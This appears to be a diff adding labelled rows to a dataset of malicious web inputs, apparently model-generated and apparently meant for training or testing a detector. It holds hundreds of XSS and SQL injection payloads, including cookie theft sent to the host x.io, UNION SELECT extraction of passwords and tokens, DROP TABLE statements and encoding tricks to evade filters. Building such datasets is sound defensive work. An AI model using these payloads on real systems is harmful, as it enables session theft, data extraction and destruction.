+"""&gt;&lt;audio onmouseover=eval(atob('YWxlcnQoMSk'))&gt;",1,xss,codellama
+%2522%253E%253Cdiv%2520onclick%253Dalert%25281%2529%253E,1,xss,codellama
+%2527%253E%253Cdetails%2520ontoggle%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+%253Ca%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+%253Csvg%2520ontoggle%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
+%253Cobject%2520onanimationstart%253Dalert%25281%2529%253E,1,xss,codellama
+%253Cmarquee%2520onanimationstart%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
+%2522%253E%253Cdiv%2520onstart%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+'><BoDy oNpOiNtErOvEr=aLeRt(dOcUmEnT.DoMaIn)>,1,xss,codellama
+'&gt;&lt;img onclick=alert(1)&gt;,1,xss,codellama
+%2522%253E%253Cimg%2520onpointerover%253Dprint%2528%2529%253E,1,xss,codellama
+%253Cobject%2520onerror%253Dprint%2528%2529%253E,1,xss,codellama
+%2527%253E%253CViDeO%2520OnLoAd%253DeVaL%2528AtOb%2528%2527YwXlCnQoMsK%2527%2529%2529%253E,1,xss,codellama
+"""&gt;&lt;body onpointerover=confirm(1)&gt;",1,xss,codellama
+"""&gt;&lt;object onanimationstart=alert(document.cookie)&gt;",1,xss,codellama
+%2522%253E%253Cdiv%2520onmouseover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+"<A OnInPuT=""aLeRt(dOcUmEnT.DoMaIn)"">",1,xss,codellama
+%253Cscript%2520onstart%253D%2522print%2528%2529%2522%253E,1,xss,codellama
+%2527%253E%253Cinput%2520onclick%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+%2522%253E%253Ca%2520onstart%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+"<ObJeCt oNeRrOr=""FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)"">",1,xss,codellama
+"""><A OnPoInTeRoVeR=LoCaTiOn='//X.Io'>",1,xss,codellama
+%2522%253E%253Ciframe%2520onmouseover%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+%2527%2526gt%253B%2526lt%253Binput%2520onerror%253Dprint%2528%2529%2526gt%253B,1,xss,codellama
+%2522%253E%253Cbody%2520oninput%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+"<a href=""javasCrIpT:print()"">x</a>",1,xss,codellama
+"<AuDiO OnFoCuS=""aLeRt(1)"">",1,xss,codellama
+%2522%253E%253Cscript%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+%253Cdetails%2520onerror%253Dalert%25281%2529%253E,1,xss,codellama
+%253Cbody%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+<ImG OnToGgLe=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)>,1,xss,codellama
+"""><A OnErRoR=CoNfIrM(1)>",1,xss,codellama
+<ScRiPt oNmOuSeOvEr=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)>,1,xss,codellama
+%2522%253E%253Cdiv%2520ontoggle%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+"""&gt;&lt;svg onfocus=fetch('//x.io/'+document.cookie)&gt;",1,xss,codellama
+%2527%253E%253Cdiv%2520onstart%253Dprint%2528%2529%253E,1,xss,codellama
+%2522%253E%253Ca%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+"""><BoDy oNiNpUt=aLeRt(1)>",1,xss,codellama
+%253Cbody%2520ontoggle%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,codellama
+%2527%253E%253Ca%2520oninput%253Dprint%2528%2529%253E,1,xss,codellama
+%2527%253E%253Cvideo%2520ontoggle%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+%253Cinput%2520ontoggle%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
+"<DiV OnPoInTeRoVeR=""pRiNt()"">",1,xss,codellama
+"""><ScRiPt oNmOuSeOvEr=aLeRt(dOcUmEnT.DoMaIn)>",1,xss,codellama
+%253Cimg%2520onfocus%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+"""><A OnClIcK=LoCaTiOn='//X.Io'>",1,xss,codellama
+"""><SvG OnStArT=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>",1,xss,codellama
+%2527%253E%253Cobject%2520onfocus%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+%2527%253E%253Cmarquee%2520onmouseover%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+%253Cbody%2520onfocus%253D%2522print%2528%2529%2522%253E,1,xss,codellama
+"<AuDiO OnToGgLe=""EvAl(aToB('yWxLcNqOmSk'))"">",1,xss,codellama
+%253Cvideo%2520onanimationstart%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
+%2527%253E%253CDeTaIlS%2520OnAnImAtIoNsTaRt%253DaLeRt%2528dOcUmEnT.CoOkIe%2529%253E,1,xss,codellama
+%2522%253E%253Cobject%2520ontoggle%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+%253Ciframe%2520onerror%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,codellama
+%2522%253E%253Cvideo%2520onerror%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+%253Cmarquee%2520onclick%253D%2522confirm%25281%2529%2522%253E,1,xss,codellama
+<BoDy oNcLiCk=cOnFiRm(1)>,1,xss,codellama
+<A OnMoUsEoVeR=AlErT(DoCuMeNt.dOmAiN)>,1,xss,codellama
+%2522%253E%253Cobject%2520onload%253Dalert%25281%2529%253E,1,xss,codellama
+%253Cbody%2520onmouseover%253Dalert%25281%2529%253E,1,xss,codellama
+%2527%253E%253CIfRaMe%2520oNtOgGlE%253DAlErT%25281%2529%253E,1,xss,codellama
+%2527%253E%253Cdetails%2520onfocus%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,codellama
+%2527%253E%253Cmarquee%2520onload%253Dprint%2528%2529%253E,1,xss,codellama
+%253Cvideo%2520onanimationstart%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,codellama
+%2522%253E%253Cdetails%2520onanimationstart%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%2527%253E%253Cvideo%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,codellama
+%2527%253E%253Ca%2520oninput%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,codellama
+%253Cinput%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+&lt;object onclick=alert(document.cookie)&gt;,1,xss,codellama
+"""><ObJeCt oNaNiMaTiOnStArT=PrInT()>",1,xss,codellama
+%253CInPuT%2520OnAnImAtIoNsTaRt%253D%2522AlErT%2528DoCuMeNt.dOmAiN%2529%2522%253E,1,xss,codellama
+%2522%253E%253Cvideo%2520onanimationstart%253Dconfirm%25281%2529%253E,1,xss,codellama
+%253Caudio%2520onload%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,codellama
+%2527%253E%253Cdiv%2520onfocus%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,codellama
+<DeTaIlS OnAnImAtIoNsTaRt=aLeRt(1)>,1,xss,codellama
+%2527%253E%253Ca%2520onload%253Dconfirm%25281%2529%253E,1,xss,codellama
+%2527%253E%253Cinput%2520onload%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+"&lt;div oninput=""confirm(1)""&gt;",1,xss,codellama
+<MaRqUeE OnInPuT=AlErT(DoCuMeNt.cOoKiE)>,1,xss,codellama
+%2527%253E%253Csvg%2520onpointerover%253Dalert%2528document.domain%2529%253E,1,xss,codellama
+%253Ciframe%2520onanimationstart%253Dconfirm%25281%2529%253E,1,xss,codellama
+%2527%2529%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%2520%2528S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520COUNT%2528%252A%2529%2520F%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FM%2520sessions%2529%253E0%2523,1,sqli,deepseek-r1
+']; dRoP TaBlE AdMiN-- -,1,sqli,deepseek-r1
+')%09AnD%091 BeTwEeN 0 AnD 9%09#,1,sqli,deepseek-r1
+%2527%2529%252f%252A%252a%252FaNd%252F%252a%252A%252f%2527a%2527%253d%2527a%2527%252f%252A%252a%252F--%2520-,1,sqli,deepseek-r1
+"'/**/UNION/**/SELECT/**/token,pwd,first_name,name,user,uid/**/FROM/**/admin--",1,sqli,deepseek-r1
+')%0aUnIoN%0aSeLeCt%0aiD%0aFrOm%0acUsToMeRs--,1,sqli,deepseek-r1
+'%0aOR%0a'a'='a'%0a--%0a-,1,sqli,deepseek-r1
+%2522%2529%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%2520%2528S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520COUNT%2528%252A%2529%2520F%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FM%2520accounts%2529%253E0%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+%2560%252509OR%2525091%253D2%252509--%2520-,1,sqli,deepseek-r1
+%2527%2509A/**/N/**/D%25091%2520BETWEEN%25200%2520A/**/N/**/D%25209%2509%2523,1,sqli,deepseek-r1
+""")%09O/**/r%09'A'='A'%09/*x*/",1,sqli,deepseek-r1
+""") UnIoN SeLeCt nUlL,NuLl,nUlL,NuLl,nUlL,NuLl%23",1,sqli,deepseek-r1
+%2527%2520UNION%2520SELECT%2520username%252Crole%2520FROM%2520tokens%252523,1,sqli,deepseek-r1
+""")/**/OR/**/1%09LIKE%091/**//*x*/",1,sqli,deepseek-r1
+%2560%25250aAND%25250a0%253C1%25250a%2523,1,sqli,deepseek-r1
+')%0aOr%0A''=''%0A-- -,1,sqli,deepseek-r1
+%2527%253B%2520DROP%2520TABLE%2520staff--,1,sqli,deepseek-r1
+"""%0AaNd%0A1 bEtWeEn 0 aNd 9%0A-- ",1,sqli,deepseek-r1
+%2560%253B%2520DROP%2520TABLE%2520orders--%2520,1,sqli,deepseek-r1
+%2522%2529%252BO%252F%252A%252A%252FR%252B%2527%2527%253D%2527%2527%252B%2523,1,sqli,deepseek-r1
+`	oR	1=2	/*X*/,1,sqli,deepseek-r1
+%2560%2509AND%25091%2520LIKE%25201%2509--,1,sqli,deepseek-r1
+%2527%2529%253B%2520S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520S%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FE%252F%252A%252A%252FP%25285%2529%2523,1,sqli,deepseek-r1
+') O/**/R 0<1 /*x*/,1,sqli,deepseek-r1
+%2522%2529%252F%252A%252A%252FA%252F%252A%252A%252FN%252F%252A%252A%252FD%252F%252A%252A%252F%2527a%2527%253D%2527a%2527%252F%252A%252A%252F--%2520,1,sqli,deepseek-r1
+%2527%252BAND%252B1%2520LIKE%25201%252B--,1,sqli,deepseek-r1
+%2527%2529%25250d%25250aOR%25250d%25250a%2527a%2527%253D%2527a%2527%25250d%25250a%252523,1,sqli,deepseek-r1
+%2522%252BA/**/N/**/D%252B1%2520LIKE%25201%252B%252523,1,sqli,deepseek-r1
+%2527%25250d%25250aOR%25250d%25250a1%253D1%25250d%25250a%2523,1,sqli,deepseek-r1
+"""%0aA/**/N/**/D%0a1 BETWEEN 0 A/**/N/**/D 9%0a/*x*/",1,sqli,deepseek-r1
+%2522%2529%253B%2520D/**/R/**/O/**/P%2520TABLE%2520o/**/rders--%2520,1,sqli,deepseek-r1
+%2522%2529%252BOR%252B%2527%2527%253D%2527%2527%252B%252523,1,sqli,deepseek-r1
+%2527%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%2520%2528S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520COUNT%2528%252A%2529%2520F%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FM%2520members%2529%253E0--,1,sqli,deepseek-r1
+`%0Ao/**/R%0a0<1%0a-- ,1,sqli,deepseek-r1
+') U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T NULL-- -,1,sqli,deepseek-r1
+']	A/**/N/**/D	1/**/BETWEEN/**/0/**/A/**/N/**/D/**/9	/*x*/,1,sqli,deepseek-r1
+%2527%255D%2520A/**/N/**/D%2520%2528S/**/E/**/L/**/E/**/C/**/T%2520COUNT%2528%252A%2529%2520F/**/R/**/O/**/M%2520sessions%2529%253E0--,1,sqli,deepseek-r1
+%2522%2529%2509A%252F%252A%252A%252FN%252F%252A%252A%252FD%25091%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%2509--%2520-,1,sqli,deepseek-r1
+%2560%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520orders%2529%253E0%252523,1,sqli,deepseek-r1
+"' U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T NULL,NULL,NULL,NULL,NULL#",1,sqli,deepseek-r1
+""")	O/**/R	1/**/LIKE/**/1	--/**/",1,sqli,deepseek-r1
+%2527%2520UNION%2520SELECT%2520email%252Clast_name%252Cname%252Cpassword%2520FROM%2520customers%252523,1,sqli,deepseek-r1
+%2522%2529%253B%2520DROP%2520TABLE%2520users--%2520-,1,sqli,deepseek-r1
+""")%0d%0aA/**/N/**/D%0d%0a0<1%0d%0a--",1,sqli,deepseek-r1
+%2527%2529%253b%2520dRoP%2520TaBlE%2520AdMiN--%2520,1,sqli,deepseek-r1
+`%09OR%091/**/LIKE/**/1%09--/**/-,1,sqli,deepseek-r1
+'%09AND%091+BETWEEN+0+AND+9%09#,1,sqli,deepseek-r1
+%2527%255D%25250d%25250aO/**/R%25250d%25250a1%2520LIKE%25201%25250d%25250a--%2520-,1,sqli,deepseek-r1
+%2522%25250aOR%25250a1%253D2%25250a--,1,sqli,deepseek-r1
+')/**/A/**/N/**/D/**/(S/**/E/**/L/**/E/**/C/**/T/**/COUNT(*)/**/F/**/R/**/O/**/M/**/sessions)>0/*x*/,1,sqli,deepseek-r1
+""")%0aOr%0A2>1%0A%23",1,sqli,deepseek-r1
+%2527%255D%2509AND%2509%2527a%2527%253D%2527a%2527%2509%252523,1,sqli,deepseek-r1
+%2522%2529%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520users%2529%253E0--,1,sqli,deepseek-r1
+%2527%2529%252BA/**/N/**/D%252B1%253D2%252B--%2520-,1,sqli,deepseek-r1
+""")+AnD+(sElEcT+CoUnT(*)+fRoM+UsErS)>0%23",1,sqli,deepseek-r1
+"""%0aoR%0a2>1%0a%23",1,sqli,deepseek-r1
+%2522%25250aO%252F%252A%252A%252FR%25250a1%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%25250a--%2520,1,sqli,deepseek-r1
+""")+A/**/N/**/D+1 LIKE 1+-- -",1,sqli,deepseek-r1
+""")/**/a/**/N/**/d/**/1=1/**//*x*/",1,sqli,deepseek-r1
+%2522%2529%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL%252CNULL%252CNULL%2523,1,sqli,deepseek-r1
+`	aNd	2>1	--+-,1,sqli,deepseek-r1
+%2527%255D%2509OR%2509%2527%2527%253D%2527%2527%2509--%2520,1,sqli,deepseek-r1
+']%0d%0aA/**/N/**/D%0d%0a1 LIKE 1%0d%0a#,1,sqli,deepseek-r1
+%2560%252F%252A%252A%252FO%252F%252A%252A%252FR%252F%252A%252A%252F1%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%252F%252A%252A%252F%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+%2560%25250d%25250aO%252F%252A%252A%252FR%25250d%25250a%2527%2527%253D%2527%2527%25250d%25250a--%2520,1,sqli,deepseek-r1
+%2560%252F%252A%252A%252FOr%252F%252A%252A%252F%2527a%2527%253D%2527a%2527%252F%252A%252A%252F%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+%2522%2529%25250d%25250aAND%25250d%25250a1%2520BETWEEN%25200%2520AND%25209%25250d%25250a%252523,1,sqli,deepseek-r1
+`%09OR%091=1%09--%09-,1,sqli,deepseek-r1
+'	oR	2>1	%23,1,sqli,deepseek-r1
+%2522%2529%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520tokens%2529%253E0%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+']%0aU/**/N/**/I/**/O/**/N%0aS/**/E/**/L/**/E/**/C/**/T%0aid%0aF/**/R/**/O/**/M%0acustomers%23,1,sqli,deepseek-r1
+`%0Aa/**/N/**/d%0A0<1%0A%23,1,sqli,deepseek-r1
+"""%09oR%091=2%09/*X*/",1,sqli,deepseek-r1
+'/**/O/**/R/**/1 BETWEEN 0 A/**/N/**/D 9/**/-- ,1,sqli,deepseek-r1
+')%0d%0aOR%0d%0a1=2%0d%0a--%0a-,1,sqli,deepseek-r1
+%2560%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%2520%2528S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520COUNT%2528%252A%2529%2520F%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FM%2520sessions%2529%253E0--,1,sqli,deepseek-r1
+""")	Or	1=1	#",1,sqli,deepseek-r1
+%2522%2529%253B%2520D%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FP%2520TABLE%2520staff--,1,sqli,deepseek-r1
+%2527%252F%252A%252A%252FAND%252F%252A%252A%252F2%253E1%252F%252A%252A%252F%2523,1,sqli,deepseek-r1
+""") AnD 0<1 /*X*/",1,sqli,deepseek-r1
+')%09AnD%092>1%09--,1,sqli,deepseek-r1
+`	a/**/N/**/d	1 bEtWeEn 0 a/**/N/**/d 9	/*x*/,1,sqli,deepseek-r1
+"""/**/Or/**/1 LiKe 1/**/--",1,sqli,deepseek-r1
+%2560%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D2%252F%252A%252A%252F%2523,1,sqli,deepseek-r1
+%2527%2529%2520OR%25201%253D1%2520%2523,1,sqli,deepseek-r1
+%2527%255D%2520AND%2520%2527%2527%253D%2527%2527%2520%2523,1,sqli,deepseek-r1
+%2527%2520aNd%2520%2528SeLeCt%2520cOuNt%2528%252A%2529%2520FrOm%2520sTaFf%2529%253E0%252523,1,sqli,deepseek-r1
+']	O/**/R	2>1	#,1,sqli,deepseek-r1
+"""+oR+1=2+-- ",1,sqli,deepseek-r1
+'] A/**/N/**/D 1 LIKE 1 #,1,sqli,deepseek-r1
+"` U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T last_name,id,role,status F/**/R/**/O/**/M sessions-- -",1,sqli,deepseek-r1
+"""%0d%0aA/**/N/**/D%0d%0a1=1%0d%0a/*x*/",1,sqli,deepseek-r1
+"""%0D%0aOr%0D%0a''=''%0d%0A%23",1,sqli,deepseek-r1
+"""; DrOp tAbLe sEsSiOnS#",1,sqli,deepseek-r1
+' a/**/N/**/d 1=1 /*x*/,1,sqli,deepseek-r1
+""" oR ''='' #",1,sqli,deepseek-r1
+`;%09DROP%09TABLE%09admin%23,1,sqli,deepseek-r1
+"""/**/UNION/**/SELECT/**/id,uid/**/FROM/**/members%23",1,sqli,deepseek-r1
+""")	Or	1=2	--",1,sqli,deepseek-r1
+`/**/AnD/**/'A'='A'/**//*X*/,1,sqli,deepseek-r1
+""")	AND	2>1	--+",1,sqli,deepseek-r1
+%2560%2520AND%2520%2527a%2527%253D%2527a%2527%2520%252523,1,sqli,deepseek-r1
+""")%09O/**/R%091 LIKE 1%09/*x*/",1,sqli,deepseek-r1
+`%0AaNd%0A(SeLeCt%0AcOuNt(*)%0aFrOm%0AcReDeNtIaLs)>0/*x*/,1,sqli,deepseek-r1
+"""; D/**/R/**/O/**/P TABLE admin/*x*/",1,sqli,deepseek-r1
+""") Or (SeLeCt uSeR FrOm tOkEnS WhErE UsEr=618)=610",1,sqli,deepseek-r1
+%2527%2509oR%25092%253E1%2509%2523,1,sqli,deepseek-r1
+`%0aU/**/N/**/I/**/O/**/N%0aS/**/E/**/L/**/E/**/C/**/T%0aNULL/*x*/,1,sqli,deepseek-r1
+'	OR	'a'='a'	--%09-,1,sqli,deepseek-r1
+"""	oR	''=''	--%09",1,sqli,deepseek-r1
+"""%09A/**/N/**/D%091+BETWEEN+0+A/**/N/**/D+9%09--+",1,sqli,deepseek-r1
+%2527%2529%2509Or%25091%2520bEtWeEn%25200%2520aNd%25209%2509--%2520,1,sqli,deepseek-r1
+%2560%252BoR%252b1%253d1%252b%252F%252aX%252a%252F,1,sqli,deepseek-r1
+"') U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T name,account,email F/**/R/**/O/**/M o/**/rders#",1,sqli,deepseek-r1
+'	aNd	0<1	#,1,sqli,deepseek-r1
+%2522%2529%2509Or%25092%253E1%2509%252523,1,sqli,deepseek-r1
+%2522%2529%252F%252A%252A%252FO%252F%252A%252A%252FR%252F%252A%252A%252F0%253C1%252F%252A%252A%252F--,1,sqli,deepseek-r1
+"""%09O/**/R%092>1%09-- ",1,sqli,deepseek-r1
+'%09AND%091=1%09--%09,1,sqli,deepseek-r1
+`/**/OR/**/1%09LIKE%091/**/%23,1,sqli,deepseek-r1
+%2522%2529%25250aOR%25250a2%253E1%25250a--%2520-,1,sqli,deepseek-r1
+`;%09SELECT%09SLEEP(5)/*x*/,1,sqli,deepseek-r1
+']/**/aNd/**/''=''/**/#,1,sqli,deepseek-r1
+"') A/**/n/**/D ExTrAcTvAlUe(1,cOnCaT(0x7e,(S/**/e/**/L/**/e/**/C/**/t pAsSwO/**/rD F/**/r/**/O/**/m cUsToMeRs lImIt 1)))",1,sqli,deepseek-r1
+"""/**/O/**/R/**/1=1/**/--+-",1,sqli,deepseek-r1
+%2527%2529%2520AnD%25201%2520BeTwEeN%25200%2520AnD%25209%2520%252523,1,sqli,deepseek-r1
+""") A/**/N/**/D extractvalue(1,concat(0x7e,(S/**/E/**/L/**/E/**/C/**/T user F/**/R/**/O/**/M staff LIMIT 1)))",1,sqli,deepseek-r1
+') Or 1=1 lImIt 1-- ,1,sqli,deepseek-r1
+""")/**/oR/**/'A'='A'/**/%23",1,sqli,deepseek-r1
+%2527%252BOR%252B1%252509LIKE%2525091%252B%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+"""+OR+''=''+--%09-",1,sqli,deepseek-r1
+""")+OR+(SELECT+name+FROM+orders+WHERE+name=841)=906",1,sqli,deepseek-r1
+']/**/oR/**/(SeLeCt/**/ToKeN/**/fRoM/**/cReDeNtIaLs/**/WhErE/**/tOkEn=136)=953,1,sqli,deepseek-r1
+']%0aA/**/N/**/D%0a1=2%0a-- ,1,sqli,deepseek-r1
+"""+a/**/N/**/d+''=''+-- ",1,sqli,deepseek-r1
+%2522%2529%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520tokens%2529%253E0--%2520-,1,sqli,deepseek-r1
+%2527%252F%252A%252A%252FOR%252F%252A%252A%252F%2527%2527%253D%2527%2527%252F%252A%252A%252F--%2520-,1,sqli,deepseek-r1
+%2560%252509oR%2525091%2520BeTwEeN%25200%2520AnD%25209%252509%252F%252AX%252A%252F,1,sqli,deepseek-r1
+""";+D/**/R/**/O/**/P+TABLE+admin#",1,sqli,deepseek-r1
+%2527%255D%2520O/**/R%2520%2527%2527%253D%2527%2527%2520--%2520,1,sqli,deepseek-r1
+"""%09aNd%09''=''%09--",1,sqli,deepseek-r1
+%2560%2520uNiOn%2520sElEcT%2520NuLl%252CnUlL%252cNuLl%2523,1,sqli,deepseek-r1
+"""/**/AnD/**/1=2/**//*X*/",1,sqli,deepseek-r1
+%2522%2509aNd%25090%253C1%2509%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+')/**/AND/**/1%09LIKE%091/**/#,1,sqli,deepseek-r1
+'	OR	1=1	--/**/,1,sqli,deepseek-r1
+']%0aA/**/n/**/D%0a1=1%0a--,1,sqli,deepseek-r1
+%2527%2529%252509AnD%2525092%253E1%252509%252523,1,sqli,deepseek-r1
+""")/**/O/**/R/**/''=''/**/--",1,sqli,deepseek-r1
+%2522%2529%2520UNION%2520SELECT%2520NULL%252CNULL%2523,1,sqli,deepseek-r1
+')	A/**/N/**/D	1=2	--+-,1,sqli,deepseek-r1
+""" oR 1 LiKe 1 -- ",1,sqli,deepseek-r1
+%2522%2529%2520AND%25202%253E1%2520--%2520,1,sqli,deepseek-r1
+"""%0d%0aA/**/N/**/D%0d%0a1%09BETWEEN%090%09A/**/N/**/D%099%0d%0a--%09",1,sqli,deepseek-r1
+%2522%2520AND%25201%2520LIKE%25201%2520--,1,sqli,deepseek-r1
+"""%09aNd%09'A'='A'%09--",1,sqli,deepseek-r1
+']%0aO/**/R%0a1 BETWEEN 0 A/**/N/**/D 9%0a--,1,sqli,deepseek-r1
+%2527%2529%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL--%2520-,1,sqli,deepseek-r1
+`%0d%0aA/**/N/**/D%0d%0a1=1%0d%0a%23,1,sqli,deepseek-r1
+%2527%253B%2520DROP%2520TABLE%2520orders%252523,1,sqli,deepseek-r1
+')	Or	1%09bEtWeEn%090%09aNd%099	--%09-,1,sqli,deepseek-r1
+')+Or+1=1+--+,1,sqli,deepseek-r1
+`%0aA/**/N/**/D%0a2>1%0a/*x*/,1,sqli,deepseek-r1
+%2527%2520OR%25201%2520LIKE%25201%2520--,1,sqli,deepseek-r1
+%2522%2509OR%2509%2527%2527%253D%2527%2527%2509%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+%2560%252509UNION%252509SELECT%252509role%252Caccount%252509FROM%252509accounts--,1,sqli,deepseek-r1
+""")%0aAnD%0a''=''%0a/*X*/",1,sqli,deepseek-r1
+%2527%255D%2520UnIoN%2520SeLeCt%2520aCcOuNt%252CrOlE%252cEmAiL%2520FrOm%2520sTaFf%2523,1,sqli,deepseek-r1
+`%09AND%091+BETWEEN+0+AND+9%09--+-,1,sqli,deepseek-r1
+"""%09OR%091=1%09--%0a-",1,sqli,deepseek-r1
+"""%0D%0aAnD%0d%0A''=''%0D%0a#",1,sqli,deepseek-r1
+`/**/AND/**/1%0aBETWEEN%0a0%0aAND%0a9/**/%23,1,sqli,deepseek-r1
+']/**/A/**/N/**/D/**/2>1/**/-- -,1,sqli,deepseek-r1
+""")%0aOR%0a2>1%0a/*x*/",1,sqli,deepseek-r1
+%2560%252BOR%252B1%2520BETWEEN%25200%2520AND%25209%252B%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+%2527%255D%2520AnD%25202%253e1%2520%2523,1,sqli,deepseek-r1
+%2527%255D%2520OR%25200%253C1%2520%2523,1,sqli,deepseek-r1
+%2522%25250D%25250aOr%25250D%25250a1%2520BeTwEeN%25200%2520AnD%25209%25250d%25250A--%2520-,1,sqli,deepseek-r1
+'/**/AnD/**/'A'='A'/**//*X*/,1,sqli,deepseek-r1
+""")/**/o/**/R/**/0<1/**/#",1,sqli,deepseek-r1
+%2560%2509aNd%25091%253D2%2509%252f%252Ax%252A%252f,1,sqli,deepseek-r1
+'%09A/**/N/**/D%092>1%09/*x*/,1,sqli,deepseek-r1
+'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/admin)>0/*x*/,1,sqli,deepseek-r1
+')/**/oR/**/'A'='A'/**//*X*/,1,sqli,deepseek-r1
+%2522%252509OR%2525091%253D2%252509%2523,1,sqli,deepseek-r1
+"') U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T email,pwd,passwo/**/rd,id,token F/**/R/**/O/**/M admin#",1,sqli,deepseek-r1
+""" oR 0<1 -- -",1,sqli,deepseek-r1
+'%09aNd%09''=''%09--,1,sqli,deepseek-r1
+%2527%255D%25250aAND%25250a%2527a%2527%253D%2527a%2527%25250a--%2520,1,sqli,deepseek-r1
+%2522%2529%252509OR%2525091%253D1%252509--%2520,1,sqli,deepseek-r1
+%2522%2529%252F%252A%252A%252FOR%252F%252A%252A%252F2%253E1%252F%252A%252A%252F%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+%2522%2529%25250aOR%25250a1%253D1%25250a%252F%252Ax%252A%252F,1,sqli,deepseek-r1
+%2527%255D%252509AND%2525090%253C1%252509%252523,1,sqli,deepseek-r1
+']+O/**/R+''=''+--,1,sqli,deepseek-r1
+%2560%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL--%2520-,1,sqli,deepseek-r1
